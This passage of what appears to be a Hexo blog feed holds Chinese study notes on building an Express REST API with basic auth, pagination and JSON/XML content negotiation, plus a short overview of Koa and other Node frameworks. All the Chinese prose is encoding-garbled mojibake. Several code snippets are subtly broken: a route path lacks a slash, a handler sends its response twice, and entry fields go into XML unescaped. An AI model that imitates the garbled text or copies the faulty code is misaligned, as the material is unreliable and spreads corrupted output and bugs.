è·¯å¾„ /api ã€‚ ä¸Žå…¶å°†å›žè°ƒå‡½æ•°æ”¾åœ¨ app.VERB() é‡Œè°ƒç”¨ï¼Œä¸å¦‚æŠŠå®ƒåšæˆå•ç‹¬çš„ Node æ¨¡å—ã€‚ä¿æŒè·¯ç”±åˆ—è¡¨çš„æ¸…çˆ½ç®€æ´ã€‚ 123app.get('/api/user/:id',api.user);app.get('/api/entries/:page?',api.entries);app.post('/api/entry',api.add); 2.æ·»åŠ åŸºæœ¬çš„è®¤è¯ä½¿ç”¨ä¸­é—´ api.auth è¿™ä¸€è¿‡ç¨‹ï¼Œä¼šæ”¾åœ¨ routes/api.js æ¨¡å—ä¸­ï¼Œapp.use() æ–¹æ³•å¯ä»¥æŽ¥å—è·¯å¾„å‚æ•°ï¼Œè¿™åœ¨ Express ä¸­è¢«ç§°ä¸ºæŒ‚è½½ç‚¹ã€‚ä¸ç®¡æ˜¯ä»€ä¹ˆ HTTP è°“è¯­ï¼Œåªè¦è¯·æ±‚çš„è·¯å¾„ä»¥æŒ‚è½½ç‚¹å¼€å¤´ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªä¸­é—´ä»¶ã€‚ ä¸‹é¢è¿™æ®µä»£ç ä¸­çš„ app.use(â€˜/apiâ€™,api.auth); åº”è¯¥æ”¾åœ¨åŠ è½½æ•°æ®çš„ä¸­é—´ä»¶å‰é¢ï¼Œè¿™æ ·å¯ä»¥ç¨åŽå†ä¿®æ”¹ç”¨æˆ·åŠ è½½ä¸­é—´ä»¶ï¼Œä¸ºå·²è®¤è¯çš„ API ç”¨æˆ·åŠ è½½æ•°æ®ï¼š 123const api = require('./routes/api');app.use('/api',api.auth);app.use(user); è¦æ‰§è¡ŒåŸºæœ¬è®¤è¯ï¼Œå®‰è£… basic-auth æ¨¡å—ï¼š 1npm i -S basic-auth æŽ¥ç€ï¼Œåˆ›å»º ./routes/api.js ï¼Œå¼•å…¥ Express å’Œç”¨æˆ·æ¨¡åž‹ï¼Œå¯ä»¥ç”¨ basic-auth ä»Žè¯·æ±‚ä¸­èŽ·å–åŸºæœ¬è®¤è¯å‡­è¯ï¼Œç„¶åŽäº¤ç»™ User.authenticate è¿›è¡Œè®¤è¯ï¼š 12345678910const auth = require('basic-auth');const express = require('express');const User = require('../models/user');exports.auth = (req, res, next) =&gt; &#123; const &#123; name, pass &#125; = auth(req); User.authenticate(name, pass, (err, user) =&gt; &#123; if (user) req.remoteUser = user; next(err); &#125;);&#125; è®¤è¯å·²ç»å‡†å¤‡å¥½äº†ï¼ŒæŽ¥ä¸‹æ¥å¯ä»¥å®žçŽ° API çš„è·¯ç”±ã€‚ 3.å®žçŽ°è·¯ç”±ç¬¬ä¸€ä¸ªè¦å®žçŽ°çš„è·¯ç”±å°±æ˜¯ GET /api/user/:id ã€‚å…ˆæ ¹æ® ID å–å¾—ç”¨æˆ·æ•°æ®ï¼Œå¦‚æžœç”¨æˆ·ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›ž 404 Not Found çš„å“åº”çŠ¶æ€ç ï¼Œå¦‚æžœç”¨æˆ·å­˜åœ¨ï¼Œåˆ™å§ç”¨æˆ·æ•°æ®ä¼ ç»™ res.json() åšä¸²è¡ŒåŒ–å¤„ç†ï¼Œå¹¶ä»¥ JSON æ ¼å¼è¿”å›žæ•°æ®ï¼Œå°†ä¸‹é¢çš„ä»£ç åŠ å…¥ åˆ° routes/api.js 1234567exports.user = (req, res, next) =&gt; &#123; User.get(req.params.id, (err, user) =&gt; &#123; if (err) return next(err); if (!user.id) return res.send(404); res.json(user); &#125;);&#125; ç„¶åŽå°†è¿™ä¸ªè·¯ç”±ï¼ŒåŠ åˆ° app.js ä¸­ 1app.get(&apos;/api/user:id&apos;,api.user); 4.æµ‹è¯•ç”¨æˆ·æ•°æ®èŽ·å–å¯åŠ¨ç¨‹åºï¼Œç„¶åŽç”¨å‘½ä»¤è¡Œå·¥å…· cURL è¿›è¡Œæµ‹è¯•ï¼ŒURLä¸­æä¾›äº†å‡­è¯ tobi:ferretï¼ŒcURL ç”¨å®ƒç”Ÿæˆäº† Authorization è¯·æ±‚å¤´åŸŸï¼š 1curl http://tobi:ferret@127.0.0.1:3000/api/user/4 -v ä¸‹é¢ä¼šæµ‹è¯•ç»“æžœï¼š 4 æ˜¯ID ï¼Œå¯ä»¥ç”¨ redis-cli çš„ GET user:ids æ¥èŽ·å– id åã€‚ 5.åŽ»æŽ‰æ•æ„Ÿçš„ç”¨æˆ·æ•°æ®ä¸Šé¢çš„å›¾ç‰‡ä¸­ï¼Œç”¨æˆ·çš„å¯†ç å’Œç›éƒ½åœ¨ï¼Œå¯ä»¥åœ¨ User ä¸­å°†å®ƒä»¬åŽ»æŽ‰ï¼š 123456toJSON()&#123; return &#123; id: this.id, name: this.name &#125;&#125; å¦‚æžœæœ‰äº† .toJSON ,JSON.stringify å°±ä¼šç”¨è¿”å›žçš„ JSON æ•°æ®ï¼ŒçŽ°åœ¨å†å‘é€ä¹‹å‰é‚£ä¸ª cURL è¯·æ±‚ï¼Œå°±åªæœ‰ ID å’Œ name å±žæ€§äº†ã€‚ 6.æ·»åŠ æ¶ˆæ¯å› ä¸ºé€šè¿‡ API æ·»åŠ æ¶ˆæ¯çš„å®žçŽ°å’Œé€šè¿‡ HTML è¡¨å•æ·»åŠ çš„å®žçŽ°æ—¶å‡ ä¹Žä¸€æ¨¡ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥é‡ç”¨ä¹‹å‰ å®žçŽ°çš„ entries.submit() è·¯ç”±é€»è¾‘. ä¸åŒçš„æ˜¯ entries.submit()ä¸­ï¼Œæ¶ˆæ¯è¦æœ‰ç”¨æˆ·åå’Œå…¶ä»–ç»†èŠ‚æ¶ˆæ¯ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ç”¨æˆ·åŠ è½½ä¸­é—´ä»¶ï¼Œç”¨ basic-auth ä¸­é—´ä»¶åŠ è½½çš„ç”¨æˆ·æ•°æ®å°è£…åœ¨ res.locals.user ã€‚ä¹‹å‰åœ¨è¿›è¡ŒåŸºæœ¬è®¤è¯æ—¶ï¼Œæˆ‘ä»¬å°†ç”¨æˆ·æ•°æ®è®¾ä¸ºäº† è¯·æ±‚å¯¹è±¡çš„å±žæ€§ req.remoteUser.çŽ°åœ¨åªè¦åœ¨ç”¨æˆ·åŠ è½½ä¸­é—´ä»¶ä¸­æ£€æŸ¥è¿™ä¸ªå±žæ€§å°±å¯ä»¥äº†ã€‚æŒ‰ç…§ä¸‹é¢ä¿®æ”¹ middleware/user.js ä¸­çš„ module.exports å®šä¹‰ï¼Œç”¨æˆ·åŠ è½½ä¸­é—´ä»¶å°±èƒ½è·Ÿ API è¿›è¡Œåä½œäº†ã€‚ 123456789101112module.exports = (req, res, next) =&gt; &#123; if (req.remoteUser) &#123; res.locals.user = req.remoteUser; &#125; const uid = req.session.uid; if (!uid) return next(); User.get(uid, (err, user) =&gt; &#123; if (err) return next(err); req.user = res.locals.user = user; next(); &#125;)&#125; å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼ŒçŽ°åœ¨æ·»åŠ æ¶ˆæ¯çš„å“åº”è¿˜æ˜¯é‡å®šå‘åˆ°é¦–é¡µï¼Œæˆ‘ä»¬è¦é’ˆå¯¹ API è¯·æ±‚è°ƒæ•´ä¸€ä¸‹ã€‚ 123456789// routes/entries.jsentry.save((err) =&gt; &#123; if (err) return next(err); if (req.remoteUser) &#123; res.json(&#123; message: 'Entry added.' &#125;); &#125; else &#123; res.redirect('/'); &#125;&#125;); å¯ç”¨æ¶ˆæ¯æ·»åŠ  API 1app.post('/api/entry',entries.submit); ç”¨ä¸‹é¢çš„ cURL å‘½ä»¤æµ‹è¯•æ¶ˆæ¯æ·»åŠ  APIã€‚å®ƒå‘é€çš„æ ‡é¢˜å’Œå†…å®¹ä¸»ä½“æ•°æ®æ‰€ç”¨çš„åç§°è·Ÿ HTMLè¡¨å•è¾“å…¥åŸŸçš„åç§°ç›¸åŒï¼š 1curl -X POST -d "entry[title]='Ho ho ho'&amp;entry[body]='Santa loves you'" http://tobi:ferret@127.0.0.1:3000/api/entry 7.æ”¯æŒæ¶ˆæ¯åˆ—è¡¨æŽ¥ä¸‹æ¥è¦å®žçŽ°çš„API è·¯ç”±æ˜¯ GET/api/entries/:page?ã€‚ 12345678// app.jsexports.entries = (req, res, next) =&gt; &#123; const page = req.page; Entry.getRange(page.from, page.to, (err, entries) =&gt; &#123; if (err) return next(err); res.json(entries); &#125;);&#125;; 8.å®žçŽ°åˆ†é¡µä¸­é—´ä»¶åœ¨åˆ†é¡µæ—¶ï¼Œè¦æŸ¥è¯¢å­—ç¬¦ä¸²ä¸²ï¼Ÿpage=N æ¥ç¡®å®šå½“å‰é¡µé¢ã€‚ 12345678910111213141516171819202122232425// .middleware/page.jsmodule.exports = (cb, perpage) =&gt; &#123; // æ¯é¡µè®°å½•æ¡æ•°çš„é»˜è®¤å€¼ä¸º 10 perpage = perpage || 10; // è¿”å›žä¸­é—´ä»¶å‡½æ•° return (req, res, next) =&gt; &#123; // å°†å‚æ•° page è§£æžä¸ºåè¿›åˆ¶çš„æ•´åž‹å€¼ let page = Math.max(parseInt(req.params.page || '1', 10), 1) - 1; // è°ƒç”¨ä¼ å…¥çš„å‡½æ•° cb((err, total) =&gt; &#123; if (err) return next(err); // ä¿å­˜ page æ¥ä»¥åŽçš„å¼•ç”¨ req.page = res.locals.page = &#123; number: page, perpage: perpage, from: page * perpage, to: page * perpage + perpage - 1, total: total, count: Math.ceil(total / perpage) &#125; // å°†æŽ§åˆ¶æƒäº¤ç»™ä¸­é—´ä»¶ next(); &#125;); &#125;&#125; è¿™ä¸ªä¸­é—´ä»¶æŠ“å–èµ‹å€¼ç»™ ï¼Ÿpage = N çš„å€¼ï¼Œæ¯”å¦‚ ?page = 1,ç„¶åŽå–å¾—ç»“æžœé›†çš„æ€»æ•°ï¼Œå¹¶é¢„å…ˆè®¡ç®—å‡ºä¸€äº›å€¼æ‹¼æˆ page å¯¹è±¡ï¼ŒæŠŠå®ƒè¾“å‡ºåˆ°éœ€è¦æ¸²æŸ“çš„è§†å›¾ä¸­ã€‚æŠŠè¿™äº›å€¼æ”¾åœ¨æ¨¡æ¿å¤–è®¡ç®—å¯ä»¥å‡å°‘æ¨¡æ¿ä¸­çš„é€»è¾‘ï¼Œè®©æ¨¡æ¿æ›´åŠ ç®€æ´ã€‚ 9.æµ‹è¯•æ¶ˆæ¯è·¯ç”±ä¸‹é¢çš„ cURL å‘½ä»¤ä»ŽAPIèŽ·å–æ¶ˆæ¯ï¼š 1curl http://tobi:ferret@127.0.0.1:3000/api/entries è¾“å‡ºçš„ç»“æžœæ˜¯ä¸€ä¸ª JSON æ•°ç»„ã€‚ å¯ç”¨å†…å®¹åå•†å†…å®¹åå•†è®©å®¢æˆ·ç«¯å¯ä»¥æŒ‡å®šå®ƒä¹äºŽæŽ¥å—å¹¶ä¸”å–œæ¬¢çš„æ•°æ®æ ¼å¼ã€‚æœ¬èŠ‚ä»‹ç»å¦‚ä½•è®©API æä¾›JSON å’Œ XML æ ¼å¼çš„æ•°æ®ï¼Œä»¥ä¾¿äºŽ API çš„ä½¿ç”¨å¯ä»¥å†³å®šä»–ä»¬è¦ä½¿ç”¨å“ªç§æ•°æ®æ ¼å¼ã€‚ HTTP é€šè¿‡ accept è¯·æ±‚å¤´åŸŸæä¾›äº†å†…å®¹åå•†æœºåˆ¶ï¼Œæ¯”å¦‚è¯´ï¼ŒæŸä¸ªå®¢æˆ·ç«¯æ›´å–œæ¬¢ HTML ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æŽ¥å—æ™®é€šçš„æ–‡æœ¬ï¼Œåˆ™å¯ä»¥è¿™æ ·è®¾å®šè¯·æ±‚å¤´ï¼š 1Accept: text/plain; q = 0.5,text/html q(qvalue)è¡¨æ˜Žå³ä¾¿ text/html æ”¾åœ¨ç¬¬äºŒä½ï¼Œå®ƒçš„ä¼˜å…ˆçº§ä¹Ÿæ¯” text/plain é«˜ 50%ã€‚Express ä¼šè§£æžè¿™ä¸ªæ¶ˆæ¯å¹¶æä¾›ä¸€ä¸ªè§„èŒƒåŒ–çš„ req.accepted æ•°ç»„ï¼š 12345[&#123; value:'text/html',quality:1&#125;,&#123; value:'text/plain',quality:0.5&#125;] Express è¿˜æä¾›äº† res.format() æ–¹æ³•ï¼Œå®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ª MIME ç±»åž‹çš„æ•°ç»„å’Œä¸€äº›å›žè°ƒå‡½æ•°ã€‚ Express ä¼šå†³å®šå®¢æˆ·ç«¯æ„¿æ„æŽ¥å—ä»€ä¹ˆæ ¼å¼çš„æ•°æ®ï¼Œä»¥åŠä½ æ„¿æ„æä¾›ä»€ä¹ˆæ ¼å¼çš„æ•°æ®ï¼Œç„¶åŽè°ƒç”¨ç›¸åº”çš„ä¼šè°ƒå‡½æ•°ã€‚ 1.å®žçŽ°å†…å®¹åå•†åœ¨ router/api.js ä¸­ï¼Œæ”¯æŒå†…å®¹åå•†çš„ GET/api/entries è·¯ç”±å¦‚ä¸‹é¢çš„ä¾‹å­ã€‚JSON æƒ³ä¹‹å‰é‚£æ ·è¢«æ”¯æŒâ€”â€”ç”¨res.send()å‘é€ä¸²è¡ŒåŒ–ä¸º JSON çš„æ¶ˆæ¯æ•°æ®ã€‚XML å›žè°ƒå¾ªçŽ¯éåŽ†æ¶ˆæ¯ï¼Œå¹¶å°†å…¶å†™å…¥ socket ä¸­ã€‚æ³¨æ„ï¼Œæ²¡å¿…è¦æ˜¾ç¤ºè®¾å®š Content-type ,res.format() ä¼šè‡ªåŠ¨è®¾å®šå…³è”çš„ç±»åž‹ã€‚ 12345678910111213141516171819202122232425262728exports.entries = (req, res, next) =&gt; &#123; const page = req.page; // èŽ·å–æ¶ˆæ¯æ•°æ® Entry.getRange(page.from, page.to, (err, entries) =&gt; &#123; if (err) return next(err); // åŸºäºŽ Accept å¤´çš„å€¼è¿”å›žä¸åŒçš„å“åº” res.format(&#123; 'application/json': () =&gt; &#123; res.send(entries); &#125;, // XML å“åº” 'application/xml': () =&gt; &#123; res.write('&lt;entries&gt;\n'); entries.forEach(entry =&gt; &#123; res.write(` &lt;entry&gt; &lt;title&gt;$&#123;entry.title&#125;&lt;/title&gt; &lt;body&gt;$&#123;entry.body&#125;&lt;/body&gt; &lt;username&gt;$&#123;entry.username&#125;&lt;/username&gt; &lt;/entry&gt; `); &#125;); res.end('&lt;/entries&gt;'); &#125; &#125;); res.json(entries); &#125;);&#125;; å¦‚æžœè®¾å®šäº†é»˜è®¤å“åº”æ ¼å¼å›žè°ƒï¼Œå½“ç”¨æˆ·è¯·æ±‚çš„æ ¼å¼ä¸åœ¨ä½ ç‰¹æ„æä¾›çš„æ ¼å¼ä¸­æ—¶ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªé»˜è®¤å›žè°ƒå‡½æ•°ã€‚ res.format() æ–¹æ³•è¿˜å¯ä»¥å°†æ‰©å±•æ˜ å°„åˆ°ç›¸å…³è”çš„ MIME ç±»åž‹ä¸Šé¢ã€‚æ¯”å¦‚ ç”¨ json å’Œ xml ä»£æ›¿ application/json å’Œ application/xml ï¼Œå°±æƒ³ä¸‹é¢è¿™æ ·ã€‚ 12345678910111213141516171819202122232425262728exports.entries = (req, res, next) =&gt; &#123; const page = req.page; // èŽ·å–æ¶ˆæ¯æ•°æ® Entry.getRange(page.from, page.to, (err, entries) =&gt; &#123; if (err) return next(err); // åŸºäºŽ Accept å¤´çš„å€¼è¿”å›žä¸åŒçš„å“åº” res.format(&#123; json: () =&gt; &#123; res.send(entries); &#125;, // XML å“åº” xml: () =&gt; &#123; res.write('&lt;entries&gt;\n'); entries.forEach(entry =&gt; &#123; res.write(` &lt;entry&gt; &lt;title&gt;$&#123;entry.title&#125;&lt;/title&gt; &lt;body&gt;$&#123;entry.body&#125;&lt;/body&gt; &lt;username&gt;$&#123;entry.username&#125;&lt;/username&gt; &lt;/entry&gt; `); &#125;); res.end('&lt;/entries&gt;'); &#125; &#125;); res.json(entries); &#125;);&#125;; 2.XML å“åº” åœ¨è·¯ç”±ä¸­å†™ä¸€å¤§å †ä»£ç åªæ˜¯ä¸ºäº†è¿”å›ž XML å“åº”ï¼Œä¸æ˜¯æœ€ç®€æ´çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è§†å›¾ç³»ç»Ÿæ¥å®žçŽ°è¿™ä¸€åŠŸèƒ½ã€‚ ç”¨ä¸‹é¢çš„ EJS åˆ›å»ºä¸€ä¸ª xml æ¨¡æ¿ã€‚ä¼šå¾ªçŽ¯éåŽ†æ¶ˆæ¯ç”Ÿæˆçš„ `æ ‡ç­¾ã€‚ 123456789&lt;entries&gt; &lt;% entries.forEach(entry =&gt;&#123; %&gt; &lt;entry&gt; &lt;title&gt;&lt;%= entry.title %&gt;&lt;/title&gt; &lt;body&gt;&lt;%= entry.body %&gt;&lt;/body&gt; &lt;username&gt;&lt;%= entry.username %&gt;&lt;/username&gt; &lt;/entry&gt; &lt;% &#125;) %&gt;&lt;entries&gt; ç„¶åŽï¼ŒåŽŸæ¥çš„ XML å›žè°ƒä»¥æ¶ˆæ¯æ•°ç»„ä¸ºå‚æ•°çš„ res.render () 123xml: () =&gt; &#123; res.render('entries/xml', &#123; entries: entries &#125;);&#125; æµ‹è¯•ï¼š 1curl -i -H 'Accept: application/xml' http://tobi:ferret@127.0.0.1:3000/api/entries æ€»ç»“ï¼š Connect æ˜¯ä¸€ä¸ª HTTP æ¡†æž¶ï¼Œå¯ä»¥åœ¨å¤„ç†è¯·ä¹‹å‰å’Œä¹‹åŽå †å ä¸­é—´ä»¶ Connect ä¸­é—´ä»¶æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„å‚æ•°åŒ…æ‹¬ Node çš„è¯·æ±‚å’Œå“åº”å¯¹è±¡ã€ä¸€ä¸ªè°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶çš„å‡½æ•°ï¼Œä»¥åŠä¸€ä¸ªå¯é€‰çš„é”™è¯¯å¯¹è±¡ Express Web ç¨‹åºä¹Ÿæ˜¯å¯ç”¨ä¸­é—´ä»¶æ­å»ºçš„ã€‚ åœ¨ç”¨ Expresss å®žçŽ° REST ful API æ—¶ï¼Œå¯ä»¥ç”¨ HTTP è°“è¯­å®šä¹‰è·¯ç”± Express è·¯ç”±çš„å“åº”å¯ä»¥æ˜¯ JSON / HTML ä»¥åŠå…¶ä»–æ ¼å¼å®šä¹‰çš„æ•°æ® Express æœ‰ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“Ž API ï¼Œæ”¯æŒå¾ˆå¤šå¼•æ“Žã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” æœåŠ¡å™¨ç«¯æ¡†æž¶]]></title>
    <url>%2F2018-12-07-NodeJs2-Part5.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ æœåŠ¡å™¨ç«¯æ¡†æž¶æœ¬ç« å†…å®¹ ä½¿ç”¨çƒ­é—¨çš„ Node Web æ¡†æž¶ é€‰æ‹©åˆé€‚çš„æ¡†æž¶ ç”¨ Web æ¡†æž¶æ­å»º Web ç¨‹åº å¦‚ä½•ä¸ºç»™å®šé¡¹ç›®é€‰æ‹©æœ€å¥½çš„æ¡†æž¶ã€‚ KoaKoa æ˜¯ä»¥ Express ä¸ºåŸºç¡€å¼€å‘çš„ï¼Œä½†å®ƒç”¨ ESS2015 ä¸­çš„ç”Ÿæˆå™¨è¯­æ³•æ¥å®šä¹‰ä¸­é—´ä»¶ï¼Œå¯ä»¥ç”¨ yield é€€å‡ºå’Œé‡å…¥ä¸­é—´ä»¶ã€‚ ä¸»è¦ç‰¹ç‚¹ï¼šHTTP æœåŠ¡å™¨åº“ï¼ŒåŸºäºŽç”Ÿæˆå™¨çš„ä¸­é—´ä»¶ï¼Œè¯·æ±‚/å“åº”æ¨¡åž‹ï¼Œåº”ç”¨äºŽè½»åž‹ Web ç¨‹åºã€ä¸ä¸¥æ ¼çš„ HTTP APIã€å•é¡µ Web ç¨‹åºã€‚ è¿™æ®µä»£ç æ¼”ç¤ºäº† åœ¨ Koa å¦‚ä½•ä½¿ç”¨ yield è½¬åˆ°ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ç»„ä»¶ï¼Œç­‰å®ƒæ‰§è¡Œå®Œå†å›žæ¥ç»§ç»­æ‰§è¡Œè°ƒç”¨è€…ä¸­é—´ä»¶çš„é€»è¾‘ã€‚ 1234567891011121314const koa = require('koa');const app = koa();app.use(function*(next)&#123; const start = new Date(); // yield ä»¥è¿è¡Œä¸‹ä¸€ä¸ªä¸­é—´ä»¶ç»„ä»¶ yield next; const ms = new Date - start; console.log('%s %s - %s'ï¼Œthis.method, this.url, ms);&#125;);app.use(function*()&#123; // è¿è¡Œå®ŒåŽå›žåˆ°æœ€åˆ yield çš„ä½ç½®ç»§ç»­æ‰§è¡Œ this.body = 'Hello World';&#125;);app.listen(3000); æ³¨æ„å…³é”®å­— function *ï¼Œè¿™é‡Œæ˜¯ä¸å¯èƒ½ç”¨ç®­å¤´å‡½æ•°çš„ã€‚ç”¨ yield å…³é”®å­—å°†æ‰§è¡Œæ­¥éª¤è½¬åˆ°ä¸­é—´ä»¶çš„æ ˆä¸­åŽ»ï¼Œç„¶åŽåœ¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶è¿”å›žåŽå†å›žæ¥ã€‚ä½¿ç”¨ç”Ÿæˆå™¨å‡½æ•°å¸¦æ¥çš„é¢å¤–å¥½å¤„æ˜¯åªè¦è®¾å®š this.body å°±å¥½äº†ã€‚Express åˆ™éœ€è¦ç”¨å‡½æ•°å‘é€å“åº”ï¼šres.send(response)ã€‚åœ¨ Koa ä¸­é—´ä»¶ä¸­ï¼Œ this å°±æ˜¯ä¸Šä¸‹æ–‡ã€‚æ¯ä¸ªè¯·æ±‚éƒ½æœ‰å¯¹åº”çš„ä¸Šä¸‹æ–‡ï¼Œç”¨æ¥å°è£… Node çš„ HTTP request å’Œ response å¯¹è±¡ã€‚åœ¨éœ€è¦è®¿é—®è¯·æ±‚é‡Œçš„ä¸œè¥¿æ—¶ï¼Œæ¯”å¦‚ Get å‚æ•°æˆ–è€…æ˜¯ cookieï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡æ¥è®¿é—®ã€‚å“åº”ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œ è®¾å®š this.body çš„å€¼å°±å¯ä»¥æŽ§åˆ¶é€ä»€ä¹ˆç»™æµè§ˆå™¨ã€‚ è®¾ç½®Koa é¡¹ç›®çš„è®¾ç½®å·¥ä½œåŒ…æ‹¬å®‰è£…æ¨¡å—å’Œå®šä¹‰ä¸­é—´ä»¶ã€‚å¦‚æžœéœ€è¦æ›´å¤šåŠŸèƒ½ï¼Œæ¯”å¦‚è¦é€šè¿‡è·¯ç”± APIå®šä¹‰å’Œå“åº”å„ç§ HTTP è¯·æ±‚ï¼Œåˆ™éœ€è¦å®‰è£…è·¯ç”±ä¸­é—´ä»¶ã€‚ å®šä¹‰è·¯ç”±koa-router æ˜¯ä¸€ä¸ªæµè¡Œçš„è·¯ç”±å™¨ä¸­é—´ä»¶ç»„ä»¶ã€‚å®ƒä¹Ÿæ˜¯åŸºäºŽ HTTP åŠ¨è¯çš„ï¼Œè¿™ç‚¹è·Ÿ Express ä¸€æ ·ï¼Œä¸åŒä¹‹å¤„æ˜¯å®ƒçš„é“¾å¼ APIã€‚ä¸‹é¢è¿™æ®µä»£ç æ¼”ç¤ºäº†å®ƒçš„è·¯ç”±å®šä¹‰ï¼š 1234567router.post('/pages',function*(next)&#123; // åˆ›å»ºé¡µé¢&#125;).get('pages/:id',function*(next)&#123; // æ¸²æŸ“é¡µé¢&#125;).put('pages-update','/pages/:id',function*(next)&#123; // æ›´æ–°é¡µé¢&#125;); å¯ä»¥æä¾›é¢å¤–çš„å‚æ•°ç»™è·¯ç”±å‘½åã€‚è¿™å¯ä»¥ç”¨æ¥ç”Ÿæˆ URLï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰ Node Web æ¡†æž¶éƒ½æ”¯æŒè¿™ä¸€åŠŸèƒ½ã€‚è¿™é‡Œæœ‰ä¸ªä¾‹å­ï¼š 1router.url('pages-update', '99'); ä¼˜ç¼ºç‚¹å®˜ç½‘ æ€»ç»“ Koa è½»ä¾¿ã€æžç®€ï¼Œåœ¨ä¸­é—´ä»¶ä¸­ä½¿ç”¨ ES2015 ç”Ÿæˆå™¨è¯­æ³•ã€‚é€‚åˆä¾èµ–å¤–éƒ¨ Web API çš„å•é¡µWeb ç¨‹åº hapi çš„é‡ç‚¹æ˜¯ HTTP æœåŠ¡å™¨å’Œè·¯ç”±ã€‚é€‚åˆç”±å¾ˆå¤šå°æœåŠ¡å™¨ç»„æˆçš„è½»ä¾¿åŽå°ã€‚ Flatiron æ˜¯ä¸€ç»„è§£è€¦çš„æ¨¡å—ï¼Œæ—¢å¯ä»¥å½“ä½œ Web MVC æ¡†æž¶æ¥ç”¨ï¼Œä¹Ÿå¯ä»¥å½“ä½œæ›´è½»ä¾¿çš„ Expressåº“ã€‚Flatiron è·Ÿ Connect ä¸­é—´ä»¶æ˜¯å…¼å®¹çš„ Kraken æ˜¯åŸºäºŽ Express çš„ï¼Œæ·»åŠ äº†å®‰å…¨ç‰¹æ€§ã€‚å¯ä»¥ç”¨äºŽ MVCã€‚ Sails.js æ˜¯ Rails/Django é£Žæ ¼çš„ MVC æ¡†æž¶ã€‚æœ‰ ORM å’Œæ¨¡æ¿ç³»ç»Ÿã€‚ DerbyJS æ˜¯ä¸ªåŒæž„æ¡†æž¶ï¼Œé€‚åˆå®žæ—¶ç¨‹åº LoopBack å¸®æˆ‘ä»¬çœæŽ‰äº†å†™å¥—è·¯åŒ–ä»£ç çš„å·¥ä½œã€‚å®ƒå¯ä»¥å¿«é€Ÿç”Ÿæˆå¸¦æœ‰æ•°æ®åº“æ”¯æŒçš„ REST APIï¼Œå¹¶æœ‰ä¸ª API ç®¡ç†ç•Œé¢ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” å‰ç«¯æž„å»ºç³»ç»Ÿ]]></title>
    <url>%2F2018-12-06-NodeJs2-Part4.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ å‰ç«¯æž„å»ºç³»ç»Ÿæœ¬ç« å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ npm è„šæœ¬ã€Gulp å’Œ Webpack æ­å»ºæ˜“äºŽç»´æŠ¤çš„ä»£ç ã€‚å› ä¸ºå¯ä»¥ä½¿ç”¨ Babel è½¬è¯‘ï¼Œæ‰€ä»¥æ— é¡»æ‹…å¿ƒæµè§ˆå™¨å¯¹ES2015çš„æ”¯æŒã€‚ äº†è§£åŸºäºŽ Node çš„å‰ç«¯å¼€å‘npm å¯ä»¥ç”¨äºŽå‰ç«¯æ¨¡å—ï¼Œä¾‹å¦‚ React,ä¹Ÿå¯ä»¥ç”¨äºŽåŽå°ä»£ç ï¼Œæ¯”å¦‚ Expressã€‚lodashä½œä¸ºé€šç”¨åº“ï¼Œæ—¢å¯ä»¥ç”¨åœ¨ Node ä¸­ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨æµè§ˆå™¨ä¸­ã€‚ ä¹Ÿæœ‰ä¸“é—¨é’ˆå¯¹å®¢æˆ·ç«¯çš„æ¨¡å—ç³»ç»Ÿï¼Œæ¯”å¦‚ Bower,ä¹Ÿå¯ä»¥æŽ¥ç€ä½¿ç”¨è¿™äº›å·¥å…·ï¼Œä½†ä½œä¸º Node å¼€å‘äººå‘˜ï¼Œåº”è¯¥ä¼˜å…ˆè€ƒè™‘ npmã€‚ å¦å¤–æ¯”å¦‚åƒ Babelè¿™ç§èƒ½å°† ES2015è½¬æ¢æˆæ”¯æŒæ›´å¹¿æ³›çš„ ES5 ä»£ç çš„è½¬è¯‘å™¨ã€‚è¿˜æœ‰åƒ UglifyJSè¿™æ ·çš„ç¼©ç å™¨ï¼Œä»¥åŠåƒ ESLintè¿™æ ·çš„ç”¨æ¥æ£€éªŒä»£ç æ­£ç¡®æ€§çš„å‰ªæ¯›å™¨ä¹Ÿéƒ½è¶Šæ¥è¶Šè¢«å‰ç«¯å¼€å‘äººå‘˜æ‰€é’çã€‚ ä¸ºäº†å¯ä»¥æ›´æ–¹ä¾¿åœ°æž„å»ºçŽ¯å¢ƒï¼Œä¼šä½¿ç”¨ npm è„šæœ¬ã€Gulpæˆ– Webpackã€‚ ç”¨ npm è¿è¡Œè„šæœ¬Node æœ‰ npm ,è€Œ npm èƒ½è¿è¡Œè„šæœ¬ã€‚å› æ­¤ï¼Œç”¨æˆ·è¦èƒ½å¤Ÿè°ƒç”¨ npm start å’Œ npm test 